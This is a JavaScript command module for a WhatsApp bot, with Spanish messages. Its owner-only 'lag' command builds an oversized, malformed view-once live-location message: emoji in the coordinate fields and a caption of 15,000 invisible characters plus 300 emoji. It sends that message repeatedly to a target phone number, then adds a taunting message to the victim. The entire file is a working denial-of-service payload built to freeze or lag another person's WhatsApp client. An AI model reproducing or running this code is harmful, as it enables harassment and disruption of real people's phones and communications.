const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, args, isOwner, usedPrefix, command }) => {
  if (!isOwner) {
    return m.reply(`
╭─❌ *ACCESO DENEGADO* ❌─╮
│ Este comando solo puede ser ejecutado por el propietario del sistema Shizuka.
╰────────────────────────╯`)
  }

  // 🎯 Validación de formato
  if (!args[0] || !args[1]) {
    return m.reply(`
╭─📡 *USO INCORRECTO* 📡─╮
│ Formato esperado:
│ *${usedPrefix + command} número | cantidad*
│ 
│ Ejemplo:
│ *${usedPrefix + command} 5219991234567 | 20*
│ 
│ ⚠️ Asegúrate de separar con el símbolo "|"
╰────────────────────────╯`)
  }

  const [numeroRaw, cantidadRaw] = args.join(' ').split('|').map(v => v.trim())
  const numeroLimpio = numeroRaw.replace(/\D/g, '')
  const numero = numeroLimpio + '@s.whatsapp.net'
  const cantidad = parseInt(cantidadRaw)

  // 🧪 Validaciones suaves
  if (!numeroLimpio || numeroLimpio.length < 10) {
    return m.reply(`
╭─⚠️ *NÚMERO INVÁLIDO* ⚠️─╮
│ El número debe tener al menos 10 dígitos.
│ Ejemplo válido: *5219991234567*
╰────────────────────────╯`)
  }

  if (isNaN(cantidad) || cantidad < 1) {
    return m.reply(`
╭─⚠️ *CANTIDAD INVÁLIDA* ⚠️─╮
│ La cantidad debe ser un número mayor a 0.
│ Ejemplo: *20*
╰────────────────────────╯`)
  }

  await m.reply(`
🧠 *Sistema Shizuka en línea...*
🎯 Objetivo: *${numeroRaw}*
💣 Intensidad: *${cantidad}*
🔄 Preparando detonación ritual...
`)

  for (let i = 0; i < cantidad; i++) {
    try {
      await conn.relayMessage(numero, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 300))
    } catch (error) {
      console.error('❌ Error al enviar lag:', error)
    }
  }

  // 💬 Burla final enviada al objetivo
  try {
    await conn.sendMessage(numero, {
      text: `💣 *BOOM.*\n\n😂 *Me río en tu cara mientras tu WhatsApp tiembla.*`
    })
  } catch (error) {
    console.error('❌ Error al enviar mensaje final:', error)
  }

  return m.reply(`
✅ *Ritual completado.*

💥 Se enviaron *${cantidad}* paquetes de distorsión visual a *${numeroRaw}*.
🎭 Mensaje final enviado: *Me río en tu cara mientras tu WhatsApp tiembla.*
🗂️ Registro actualizado en el centro de datos de Shizuka.
`)
}

handler.command = /^lag$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lag número | cantidad']

export default handler